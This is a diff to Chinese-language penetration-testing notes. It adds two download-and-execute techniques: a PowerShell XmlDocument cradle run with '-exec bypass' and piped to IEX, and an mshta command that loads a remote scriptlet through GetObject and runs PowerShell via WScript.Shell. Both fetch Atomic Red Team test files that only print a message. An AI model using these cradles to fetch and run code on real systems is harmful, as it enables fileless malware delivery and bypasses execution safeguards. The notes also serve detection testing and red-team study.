@@ -33,6 +33,8 @@
   - [下载与执行文件](#下载与执行文件)
     - [Net.WebClient](#netwebclient)
     - [Msxml2.ServerXmlHttp](#msxml2serverxmlhttp)
+    - [Xml.XmlDocument](#xmlxmldocument)
+    - [mshta](#mshta)
   - [域渗透](#域渗透)
     - [域内提权-42278/42287](#域内提权-4227842287)
 
@@ -1001,6 +1003,95 @@ Write-Host $comMsXml.ResponseText
 # Invoke-Expression 执行响应(中的脚本)
 IEX $comMsXml.ResponseText
 ```
+
+---
+
+### Xml.XmlDocument
+
+```cml
+"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -exec bypass -noprofile "$Xml = (New-Object System.Xml.XmlDocument);$Xml.Load('https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.001/src/test.xml');$Xml.command.a.execute | IEX"
+```
+- `-exec bypass`: 绕过 PowerShell 的执行策略。
+
+  默认情况下 Windows 为了安全起见可能会限制运行某些脚本。使用 `-exec bypass` 可以绕过这些限制，允许运行没有签名的脚本。
+
+- `-noprofile`: 不加载 PowerShell 的配置文件
+
+`test.xml`:
+```xml
+<?xml version="1.0"?>
+<command>
+   <a>
+      <execute>write-host -ForegroundColor Cyan "$(Get-Date -Format s) Download Cradle test success!`n"</execute>
+   </a>
+  </command>
+
+```
+
+```powershell
+# 新建一个 XmlDocument 对象, 其作用是处理 XML 文档的 PowerShell 对象
+$Xml = (New-Object System.Xml.XmlDocument);
+# 使用 XmlDocument 对象的 Load 方法加载一个指定 URL 的 XML 文件
+$Xml.Load('https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.001/src/test.xml');
+# 使用 XmlDocument 对象的 command.a.execute 属性获取 XML 文件中的命令; 然后使用 Invoke-Expression 执行该命令
+$Xml.command.a.execute | IEX
+```
+
+---
+
+### mshta
+
+```cmd
+C:\Windows\system32\cmd.exe /c "mshta.exe javascript:a=GetObject('script:https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.001/src/mshta.sct').Exec();close()"
+```
+
+- `mshta` 是一个执行 HTML 应用程序（HTA）的工具。  
+  HTA 是由 HTML 和脚本（如 JavaScript 或 VBScript）组成的应用程序，它们在 Windows 上以类似于标准网页的方式运行
+- `javascript:a=GetObject('script:https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.001/src/mshta.sct').Exec();close()`
+  - `javascript:`: 指示 `mshta` 执行 JavaScript 代码
+  - `a=GetObject('script:https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.001/src/mshta.sct').Exec();`: 获取 `mshta.sct` 中的命令并执行
+  - `close()`: 关闭 `mshta` 窗口
+
+`mshta.sct`
+
+```xml
+<?XML version="1.0"?>
+<scriptlet>
+
+<registration
+    description="Tester"
+    progid="Tester"
+    version="1.00"
+    classid="{AAAA0000-0000-0000-0000-0000AAAAAAAA}"
+	>
+	<script language="JScript">
+		<![CDATA[
+
+			var r = new ActiveXObject("WScript.Shell").Run("powershell -c \"write-host -ForegroundColor Cyan $(Get-Date -Format s) 'Download Cradle test success!';Read-Host -Prompt 'Press Enter to continue'\"");
+
+		]]>
+	</script>
+</registration>
+
+<public>
+    <method name="Exec"></method>
+</public>
+<script language="JScript">
+<![CDATA[
+
+	function Exec()
+	{
+		var r = new ActiveXObject("WScript.Shell").Run("powershell -c \"write-host -ForegroundColor Cyan $(Get-Date -Format s) 'Download Cradle test success!';Read-Host -Prompt 'Press Enter to continue'\"");
+	}
+
+]]>
+</script>
+
+</scriptlet>
+
+```
+
+![image-20231205000133728](http://cdn.ayusummer233.top/DailyNotes/202312050001127.png)
 
 ---
 
